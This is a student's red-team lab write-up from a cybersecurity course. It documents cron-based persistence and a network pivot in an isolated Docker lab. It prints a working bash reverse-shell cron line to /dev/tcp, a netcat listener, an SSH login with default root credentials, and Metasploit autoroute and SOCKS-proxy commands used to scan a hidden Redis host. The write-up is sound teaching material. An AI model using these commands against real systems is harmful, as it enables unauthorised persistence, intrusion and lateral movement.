# 🌐 The Deep Network — Penetration Testing Portfolio

> **Course:** Cybersecurity Operations | Week 8 · Session 24  
> **Type:** Red Team Lab — Persistence & Network Pivoting  
> **Environment:** Kali Linux · Metasploit Framework · Docker-based Multi-Tier Network

---

## 📋 Overview

This lab simulates a real-world red team operation against a two-tier network infrastructure. The objective was to:

1. **Plant a persistent backdoor** on a compromised web server that survives reboots
2. **Pivot through the web server** to reach a hidden database server on a private subnet that is completely unreachable from the outside

The lab environment consisted of two targets:

| Host | IP Address | Visibility |
|---|---|---|
| Web-Server-01 | `172.50.0.10` | Publicly reachable |
| Database-01 (Redis) | `10.0.9.50` | Private subnet — hidden |

---

## 🧰 Tools & Technologies

| Tool | Purpose |
|---|---|
| **Metasploit Framework** | Session management, autoroute, SOCKS proxy |
| **Meterpreter** | Advanced shell with pivoting capabilities |
| **Netcat (`nc`)** | Reverse shell listener |
| **Cron** | Persistence mechanism |
| **proxychains** | Tunneling nmap through the SOCKS proxy |
| **Nmap** | Port scanning the hidden network |
| **SSH** | Initial access to the web server |

---

## ⚙️ Phase 1 — Persistence: The Cron Backdoor

### Objective
Establish a persistent reverse shell on Web-Server-01 that automatically reconnects every minute, even after a reboot.

### Steps Performed

**1. Started a Netcat listener on the attack machine:**
```bash
nc -lvnp 4444
```

**2. SSH'd into the compromised web server:**
```bash
ssh root@172.50.0.10
```

**3. Installed cron and nano (minimal container environment):**
```bash
apt-get update && apt-get install -y cron nano
service cron start
```

**4. Planted the reverse shell cron job:**
```bash
crontab -e
```
Added the following line:
```
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.50.0.1/4444 0>&1'
```

**5. Caught the incoming shell on the listener:**
```
Connection received on 172.50.0.10 51756
root@bf567778c8b7:~#
```

### Result ✅
A root reverse shell was automatically delivered to the attack machine every 60 seconds without any manual interaction — demonstrating persistence via cron scheduling.

---

## ⚙️ Phase 2 — Lateral Movement: The Pivot

### Objective
Use Web-Server-01 as a bridge to scan and reach Database-01 at `10.0.9.50`, a host that the attack machine cannot reach directly.

### Steps Performed

**1. Opened a Metasploit SSH session on Web-Server-01:**
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.50.0.10
set USERNAME root
set PASSWORD root
run
```
Result: `SSH session 2 opened`

**2. Upgraded to Meterpreter for full pivoting capability:**
```bash
sessions -u 2
```
Result: `Meterpreter session 3 opened`

**3. Added a route to the hidden private network through the session:**
```bash
sessions -i 3
run autoroute -s 10.0.9.0/24
```
Result: `Added route to 10.0.9.0/255.255.255.0 via 172.50.0.10`

**4. Started the SOCKS proxy to tunnel arbitrary tools:**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j
```
Result: `SOCKS proxy server started on port 1080`

**5. Configured proxychains to use the Metasploit proxy:**
```
socks4  127.0.0.1 1080
```

**6. Scanned the hidden network through the tunnel:**
```bash
proxychains nmap -sT -Pn -p 1-10000 10.0.9.50
```

### Result ✅

```
Nmap scan report for 10.0.9.50
Host is up.
PORT     STATE SERVICE
6379/tcp open  redis
```

A Redis database service was discovered on the private subnet — a host that was completely unreachable before the pivot was established.

---

## 🗺️ Network Diagram

```
[Attack Machine]          [Web-Server-01]         [Database-01]
 172.50.0.1        --->    172.50.0.10      --->   10.0.9.50
 (Kali Linux)            (Pivot Point)           (Hidden Redis)

 Direct access ✅        Used as tunnel ✅       No direct route ❌
                                                 Via pivot only ✅
```

---

## 🧠 Concepts Demonstrated

| Concept | Description |
|---|---|
| **Persistence** | Cron-based reverse shell that survives reboots |
| **Reverse Shell** | Target connects back to attacker, bypassing firewalls |
| **Lateral Movement** | Moving from one compromised host deeper into the network |
| **Network Pivoting** | Using a compromised host to reach otherwise isolated segments |
| **SOCKS Proxying** | Tunneling arbitrary tools through Metasploit |
| **Port Scanning via Proxy** | Running Nmap through proxychains on a hidden subnet |

---

## 📸 Proof of Exploitation

**Artifact:** `pivot_success.png`  
**Location:** `~/Pivot_Operation/pivot_success.png`  
**Shows:** proxychains nmap output confirming Redis (port 6379) open on `10.0.9.50`

---

## ⚠️ Legal Disclaimer

> This lab was performed in a controlled, isolated educational environment.  
> All targets were intentionally vulnerable virtual machines provisioned for this course.  
> No real systems were harmed. This work is intended solely for educational purposes.

---

## 👤 Author

**wendkali**  
Cybersecurity Student | Penetration Testing Track  
_Portfolio Repository — Metasploit Framework Lab Series_